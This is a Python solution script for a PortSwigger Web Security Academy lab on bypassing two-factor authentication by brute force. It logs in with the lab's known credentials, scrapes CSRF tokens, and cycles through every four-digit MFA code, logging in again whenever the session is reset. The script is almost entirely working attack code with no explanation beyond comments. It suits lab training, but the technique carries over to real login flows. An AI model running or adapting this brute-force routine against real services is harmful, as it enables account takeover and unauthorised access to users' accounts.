# PortSwigger
# Lab: 2FA bypass using a brute-force attack

import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target Data
url = ""

# Localhost Proxies (To intercept with Burp Suite)
proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }

# Golbals
session = ""
csrf = ""

def get_session_csrf(response: requests.Response):
    global session, csrf

    if len(response.cookies) > 0:
        session = response.cookies['session']
    
    csrf = ''
    soup = BeautifulSoup(response.text, 'html.parser')
    hidden_inputs = soup.find_all(name='input', type='hidden')

    while len(hidden_inputs) > 0 and csrf == '':
        if hidden_inputs[0]['name'] == 'csrf':
            csrf = hidden_inputs[0]['value']
        
        del hidden_inputs[0]

def login():
    global session

    cookies = { "session": session }
    playload = f"csrf={csrf}&username=carlos&password=montoya"
    response = requests.post(url + '/login', data=playload, cookies=cookies, verify=False, proxies=proxies)
    
    get_session_csrf(response)

    # Get the session of the logged-in user
    if len(response.history) > 0 and len(response.history[0].cookies) > 0:
        session = response.history[0].cookies['session']

def main():    
    mfa_code = '0000'

    # Go to login page
    response_login = requests.get(url + '/login', verify=False, proxies=proxies)
    get_session_csrf(response_login)
    login()

    # Forcing security code
    print("\r(+) Forcing security code...")

    last_response = None
    for i in range(1, 10000):
        mfa_code = ('0' * (4 - len(str(i)))) + str(i)
        sys.stdout.write("\r%s" % mfa_code)
        sys.stdout.flush()


        if last_response != None and 'Log in' in last_response.text: 
            login()

        cookies = { "session": session }
        playload = f"csrf={csrf}&mfa-code={mfa_code}"
        last_response = requests.post(url + '/login2', data=playload, cookies=cookies, verify=False, proxies=proxies)
        get_session_csrf(last_response)

        if len(last_response.history) >= 1 and last_response.history[0].status_code == 302 or last_response.status_code == 302:
            break

    print('\r(+) The security code is %s' % mfa_code)


if __name__ == "__main__":
    main()